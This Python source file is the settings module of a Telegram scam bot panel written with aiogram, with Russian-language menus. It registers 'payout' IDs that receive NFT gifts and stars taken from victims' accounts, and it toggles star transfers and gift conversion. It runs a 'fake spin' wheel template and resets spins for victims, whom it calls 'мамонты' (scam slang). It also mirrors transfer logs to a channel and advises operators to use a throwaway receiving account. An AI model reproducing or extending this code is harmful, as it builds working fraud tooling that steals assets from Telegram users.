from aiogram import Router, types, F
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from sqlalchemy import func, select, update
from db import Session
from models import Admin, Settings, WorkerBot, WorkerBotUser
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from sqlalchemy.orm import selectinload
from sqlalchemy import or_

router = Router()

class AddIDState(StatesGroup):
    waiting_for_id = State()

class AddIDState(StatesGroup):
    waiting_for_id = State()

class ResetUserSpinState(StatesGroup):
    waiting_for_user_id = State()

# Новый State для лог-канала
class LogChannelState(StatesGroup):
    waiting_for_channel_id = State()

@router.message(F.text == "⚙️ Настройки")
async def settings_handler(message: types.Message):
    if message.chat.type != "private":
        await message.answer("⛔ Доступно только в личке с ботом.")
        return

    await send_transfer_status(message)

async def get_admin_and_settings(tg_id: int):
    async with Session() as session:
        stmt_admin = select(Admin).where(Admin.telegram_id == tg_id)
        admin = (await session.execute(stmt_admin)).scalar_one_or_none()
        if not admin:
            return None, None

        stmt_settings = select(Settings).where(Settings.admin_id == admin.id)
        settings = (await session.execute(stmt_settings)).scalar_one_or_none()

        if not settings:
            settings = Settings(admin_id=admin.id, payout_ids="")
            session.add(settings)
            await session.commit()

        return admin, settings

async def send_transfer_status(message_or_callback):
    if isinstance(message_or_callback, types.Message):
        tg_id = message_or_callback.from_user.id
    else:
        tg_id = message_or_callback.from_user.id

    _, settings = await get_admin_and_settings(tg_id)
    payout_connected = "✅ <b>Передача подключена.</b>" if settings and settings.payout_ids else "❌ <b>Передача не подключена.</b>"

    text = (
        "⚙️ <b>Настройки</b>\n\n"
        "🚀 <b>Передача NFT</b> — нужно чтобы передавать NFT на ваш аккаунт.\n"
        "⚡️ Запусти всех своих ботов на аккаунте для успешной передачи.\n\n"
        f"{payout_connected}\n\n"
        "🛠 <b>Что можно настроить:</b>\n"
        "• Список аккаунтов для передачи\n"
        "• Опции передачи\n"
        "• Управление шаблонами\n"
        "• Включить лог-канал\n"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Передача", callback_data="add_payout_id"),
            InlineKeyboardButton(text="Аккаунты", callback_data="manage_workers")
        ],
        [
            InlineKeyboardButton(text="Опции", callback_data="open_transfer_menu"),
            InlineKeyboardButton(text="Шаблоны", callback_data="manage_templates")
        ],
        [
            InlineKeyboardButton(text="Лог-канал", callback_data="log_channel")
        ]
    ])

    if isinstance(message_or_callback, types.Message):
        await message_or_callback.answer(text, reply_markup=keyboard, parse_mode="HTML")
    else:
        await message_or_callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
        await message_or_callback.answer()

@router.callback_query(F.data == "add_payout_id")
async def add_payout_id_start(callback: types.CallbackQuery, state: FSMContext):
    text = (
        "<b>📥 Пришлите Telegram ID</b> аккаунта, которому вы хотите передавать подарки.\n\n"
        "🔎 Узнать его можно в боте: <b>@getmyid_bot</b>\n"
        "👆 Просто откройте бот, нажмите <b>Start</b> и скопируйте ID.\n\n"
        "⚠️ <b>Не используйте свой основной аккаунт.</b>\n"
        "Рекомендуем создать отдельный аккаунт для получения подарков."
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="back_to_settings")]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(AddIDState.waiting_for_id)
    await callback.answer()

@router.message(AddIDState.waiting_for_id)
async def save_payout_id(message: types.Message, state: FSMContext):
    new_id = message.text.strip()

    if not new_id.isdigit():
        await message.answer("❌ ID должен быть числом. Попробуй ещё раз.")
        return

    admin, settings = await get_admin_and_settings(message.from_user.id)
    if not admin:
        await message.answer("❌ Профиль не найден.")
        await state.clear()
        return

    ids = [i.strip() for i in (settings.payout_ids or "").split(",") if i.strip()]
    if new_id not in ids:
        ids.append(new_id)
    settings.payout_ids = ",".join(ids)

    admin.worker_added_payout_id_flag = True

    async with Session() as session:
        session.add_all([settings, admin])
        await session.commit()

    await state.clear()
    await message.answer("✅ <b>Сохранено</b>", parse_mode="HTML")
    await send_transfer_status(message)

@router.callback_query(F.data == "manage_workers")
async def manage_workers(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()  

    _, settings = await get_admin_and_settings(callback.from_user.id)
    ids = [i.strip() for i in settings.payout_ids.split(",") if i.strip()] if settings and settings.payout_ids else []

    text = (
        "👥 <b>Управление передачами</b>\n\n"
        "Выберите передачу (Telegram ID), которую хотите удалить из списка. "
        "Удалённые ID больше <b>не будут использовать для передачи</b>.\n\n"
        "<b>Список подключённых ID:</b>"
    )

    keyboard_buttons = [[InlineKeyboardButton(text=f"{pid}", callback_data=f"confirm_delete_{pid}")] for pid in ids]
    keyboard_buttons.append([InlineKeyboardButton(text="Назад", callback_data="back_to_settings")])

    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data.startswith("confirm_delete_"))
async def confirm_delete_id(callback: types.CallbackQuery):
    pid = callback.data.split("_")[-1]
    text = f"❗️Удалить ID <code>{pid}</code> из списка передачи?"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Да", callback_data=f"delete_id_{pid}")],
        [InlineKeyboardButton(text="Нет", callback_data="manage_workers")]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data.startswith("delete_id_"))
async def delete_id(callback: types.CallbackQuery, state: FSMContext):
    pid = callback.data.split("_")[-1]
    admin, settings = await get_admin_and_settings(callback.from_user.id)

    async with Session() as session:
        query = select(WorkerBot).where(
            WorkerBot.owner_id == admin.id,
            WorkerBot.nft_transfer_to_id == int(pid)
        )
        result = await session.execute(query)
        used_bot = result.scalar_one_or_none()

        if used_bot:
            await callback.answer(
                f"❌ ID {pid} привязан к боту @{used_bot.username} и не может быть удалён.",
                show_alert=True
            )
            return

        if settings and settings.payout_ids:
            ids = [i.strip() for i in settings.payout_ids.split(",") if i.strip()]
            if pid in ids:
                ids.remove(pid)
                settings.payout_ids = ",".join(ids)
                admin.worker_added_payout_id_flag = bool(ids)

                session.add_all([settings, admin])
                await session.commit()

    await callback.answer(text=f"✅ ID {pid} успешно удалён.", show_alert=True)
    await manage_workers(callback, state)

@router.callback_query(F.data == "back_to_settings")
async def back_to_settings(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()  
    await send_transfer_status(callback)

@router.callback_query(F.data == "open_transfer_menu")
async def open_transfer_menu(callback: types.CallbackQuery):
    _, settings = await get_admin_and_settings(callback.from_user.id)

    transfer_stars = getattr(settings, "transfer_stars_enabled", True)
    convert_gifts = getattr(settings, "convert_gifts_to_stars_enabled", True)

    transfer_stars_text = "✅ Переводить звезды" if transfer_stars else "❌ Переводить звезды"
    convert_gifts_text = "✅ Обменивать подарки" if convert_gifts else "❌ Обменивать подарки"

    text = (
        "<b>⚙️ Настройка передачи</b>\n\n"
        f"{transfer_stars_text}\n"
        f"{convert_gifts_text}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=transfer_stars_text, callback_data="toggle_transfer_stars")],
        [InlineKeyboardButton(text=convert_gifts_text, callback_data="toggle_convert_gifts")],
        [InlineKeyboardButton(text="Назад", callback_data="back_to_settings")]
    ])

    try:
        await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    except:
        await callback.message.answer(text, reply_markup=keyboard, parse_mode="HTML")

    await callback.answer()


@router.callback_query(F.data == "toggle_transfer_stars")
async def toggle_transfer_stars(callback: types.CallbackQuery):
    admin, settings = await get_admin_and_settings(callback.from_user.id)
    settings.transfer_stars_enabled = not getattr(settings, "transfer_stars_enabled", True)

    async with Session() as session:
        session.add(settings)
        await session.commit()

    try:
        await callback.message.delete()
    except:
        pass

    await open_transfer_menu(callback)


@router.callback_query(F.data == "toggle_convert_gifts")
async def toggle_convert_gifts(callback: types.CallbackQuery):
    admin, settings = await get_admin_and_settings(callback.from_user.id)
    settings.convert_gifts_to_stars_enabled = not getattr(settings, "convert_gifts_to_stars_enabled", True)

    async with Session() as session:
        session.add(settings)
        await session.commit()

    try:
        await callback.message.delete()
    except:
        pass

    await open_transfer_menu(callback)


def get_manage_templates_keyboard_and_text(fake_spin_enabled: bool, spin_count: int):
    fake_spin_text = (
        "☑️ Фейк-вращение ВКЛ" if fake_spin_enabled else "🔲 Фейк-вращение ВЫКЛ"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сбросить вращение всем", callback_data="reset_all_spins")],
        [InlineKeyboardButton(text="Сбросить вращение пользователю", callback_data="reset_user_spin")],
        [InlineKeyboardButton(text=fake_spin_text, callback_data="toggle_fake_spin")],
        [InlineKeyboardButton(text="Назад", callback_data="back_to_settings")],
    ])
    text = (
        "<b>📍 Управление шаблоном Spin-Wallet</b>\n\n"
        "☑️ Здесь можно сбросить всем или определённому мамонтам вращение.\n"
        f"🔁 Фейк-вращение: <b>{'Включено' if fake_spin_enabled else 'Выключено'}</b>\n"
        f"🎰 Успешно сделали вращение: <b>{spin_count}</b>"
    )
    return keyboard, text

async def get_admin_settings_and_stats(tg_id):
    async with Session() as session:
        admin_stmt = (
            select(Admin.id)
            .where(Admin.telegram_id == tg_id)
        )
        admin_id = (await session.execute(admin_stmt)).scalar_one_or_none()
        if not admin_id:
            return None, None, 0, 0

        settings_stmt = select(Settings.fake_spin_enabled).where(Settings.admin_id == admin_id)
        bots_stmt = select(WorkerBot.id).where(WorkerBot.owner_id == admin_id)
        fake_spin_enabled = (await session.execute(settings_stmt)).scalar_one_or_none() or False
        bot_ids = [row[0] for row in (await session.execute(bots_stmt)).all()]
        spin_count = 0
        if bot_ids:
            spin_count = (await session.execute(
                select(func.count()).select_from(WorkerBotUser).where(
                    WorkerBotUser.worker_bot_id.in_(bot_ids),
                    WorkerBotUser.spin_used.is_(True)
                )
            )).scalar_one()
        return admin_id, fake_spin_enabled, spin_count, bot_ids

@router.callback_query(F.data == "manage_templates")
async def manage_templates_handler(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    admin_id, fake_spin_enabled, spin_count, _ = await get_admin_settings_and_stats(callback.from_user.id)
    keyboard, text = get_manage_templates_keyboard_and_text(fake_spin_enabled, spin_count)
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data == "toggle_fake_spin")
async def toggle_fake_spin_handler(callback: types.CallbackQuery):
    async with Session() as session:
        admin_stmt = select(Admin.id).where(Admin.telegram_id == callback.from_user.id)
        admin_id = (await session.execute(admin_stmt)).scalar_one_or_none()
        if not admin_id:
            await callback.answer("Ошибка: вы не админ.", show_alert=True)
            return

        settings_stmt = select(Settings).where(Settings.admin_id == admin_id)
        settings = (await session.execute(settings_stmt)).scalar_one_or_none()
        if not settings:
            await callback.answer("Нет настроек.", show_alert=True)
            return

        settings.fake_spin_enabled = not bool(getattr(settings, "fake_spin_enabled", False))
        await session.commit()
        fake_spin_enabled = settings.fake_spin_enabled

        bots_stmt = select(WorkerBot.id).where(WorkerBot.owner_id == admin_id)
        bot_ids = [row[0] for row in (await session.execute(bots_stmt)).all()]
        spin_count = 0
        if bot_ids:
            spin_count = (await session.execute(
                select(func.count()).select_from(WorkerBotUser).where(
                    WorkerBotUser.worker_bot_id.in_(bot_ids),
                    WorkerBotUser.spin_used.is_(True)
                )
            )).scalar_one()

    keyboard, text = get_manage_templates_keyboard_and_text(fake_spin_enabled, spin_count)
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer(f"Фейк-вращение {'ВКЛ' if fake_spin_enabled else 'ВЫКЛ'}")

@router.callback_query(lambda c: c.data == "reset_user_spin")
async def reset_user_spin_start(callback: types.CallbackQuery, state: FSMContext):
    text = (
        "Пришли <b>ID</b> или <b>username</b> мамонта, которому нужно сбросить вращение.\n\n"
        "Можно писать как <b>@username</b>, так и просто username. ID — только число."
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="manage_templates")]
    ])
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(ResetUserSpinState.waiting_for_user_id)
    await callback.answer()

@router.message(ResetUserSpinState.waiting_for_user_id)
async def reset_user_spin_process(message: types.Message, state: FSMContext):
    user_input = message.text.strip().replace("@", "")
    admin_id, fake_spin_enabled, spin_count, bot_ids = await get_admin_settings_and_stats(message.from_user.id)
    if not admin_id:
        await message.answer("Ошибка: вы не админ.")
        await state.clear()
        return
    if not bot_ids:
        await message.answer("У вас нет подключенных ботов.")
        await state.clear()
        return

    async with Session() as session:
        where_clauses = [WorkerBotUser.worker_bot_id.in_(bot_ids)]
        if user_input.isdigit():
            where_clauses.append(WorkerBotUser.telegram_id == int(user_input))
        else:
            where_clauses.append(or_(
                WorkerBotUser.username == user_input,
                WorkerBotUser.username == f"@{user_input}"
            ))

        stmt = select(WorkerBotUser.id).where(*where_clauses)
        user_id = (await session.execute(stmt)).scalar_one_or_none()
        if not user_id:
            await message.answer("❌ Пользователь не найден или не принадлежит вашим ботам.")
            await state.clear()
            return

        upd_stmt = (
            update(WorkerBotUser)
            .where(WorkerBotUser.id == user_id)
            .values(spin_used=False)
        )
        await session.execute(upd_stmt)
        await session.commit()

    await message.answer("✅ Вращение для пользователя сброшено.")
    await state.clear()
    keyboard, text = get_manage_templates_keyboard_and_text(fake_spin_enabled, spin_count)
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@router.callback_query(lambda c: c.data == "reset_all_spins")
async def reset_all_spins_handler(callback: types.CallbackQuery):
    admin_id, fake_spin_enabled, spin_count, bot_ids = await get_admin_settings_and_stats(callback.from_user.id)
    if not admin_id:
        await callback.answer("Ошибка: вы не админ.", show_alert=True)
        return
    if not bot_ids:
        await callback.answer("У вас нет подключенных ботов.", show_alert=True)
        return

    async with Session() as session:
        upd_stmt = (
            update(WorkerBotUser)
            .where(WorkerBotUser.worker_bot_id.in_(bot_ids), WorkerBotUser.spin_used.is_(True))
            .values(spin_used=False)
        )
        result = await session.execute(upd_stmt)
        await session.commit()
        count = result.rowcount or 0

    await callback.answer(f"✅ Сброшено вращение для {count} мамонтов.", show_alert=True)

@router.callback_query(F.data == "log_channel")
async def log_channel_handler(callback: types.CallbackQuery, state: FSMContext):
    admin, _ = await get_admin_and_settings(callback.from_user.id)
    current_channel_id = admin.log_channel_id if admin else None

    text = (
        "<b>⚙️ НАСТРОЙКА ЛОГ-КАНАЛА</b>\n\n"
        "<b>1.</b> <b>Добавь этого бота <code>@AlphaSsquadBot</code> админом в свой канал.</b>\n"
        "<b>2.</b> <b>Отправь сюда ID канала (пример: <code>-1001234567890</code>)</b>\n\n"
        "<b>❓ Как получить ID канала:</b>\n"
        "<b>➤ Перешли любой пост из канала боту</b> <b>@getmyid_bot</b> <b>и скопируй ID.</b>\n"
        "<b>📤 После этого я начну дублировать туда логи передачи.</b>\n\n"
        "<b>❌ Чтобы отключить лог-канал — нажми на кнопку с его ID ниже.</b>"
    )
    keyboard_buttons = []
    if current_channel_id:
        keyboard_buttons.append(
            [InlineKeyboardButton(text=f"{current_channel_id}", callback_data="remove_log_channel")]
        )
    keyboard_buttons.append(
        [InlineKeyboardButton(text="Назад", callback_data="back_to_settings")]
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(LogChannelState.waiting_for_channel_id)  
    await callback.answer()

@router.message(LogChannelState.waiting_for_channel_id)
async def save_log_channel_id(message: types.Message, state: FSMContext):
    admin, _ = await get_admin_and_settings(message.from_user.id)
    if not admin:
        await message.answer("❌ Админ не найден.")
        await state.clear()
        return

    channel_id = message.text.strip()
    if not channel_id.startswith('-100') or not channel_id[1:].isdigit():
        await message.answer("❌ Не похоже на Telegram ID канала. Пример: <code>-1001234567890</code>", parse_mode="HTML")
        return

    admin.log_channel_id = int(channel_id)
    async with Session() as session:
        session.add(admin)
        await session.commit()

    await state.clear()
    await message.answer("✅ Лог-канал сохранён (обновлён).", parse_mode="HTML")
    await send_transfer_status(message)

# Отключить лог-канал (удаление)
@router.callback_query(F.data == "remove_log_channel")
async def remove_log_channel_handler(callback: types.CallbackQuery, state: FSMContext):
    admin, _ = await get_admin_and_settings(callback.from_user.id)
    if not admin or not admin.log_channel_id:
        await callback.answer("Лог-канал не установлен.", show_alert=True)
        return

    admin.log_channel_id = None
    async with Session() as session:
        session.add(admin)
        await session.commit()

    await callback.answer("❌ Лог-канал отключён.", show_alert=True)
    await send_transfer_status(callback)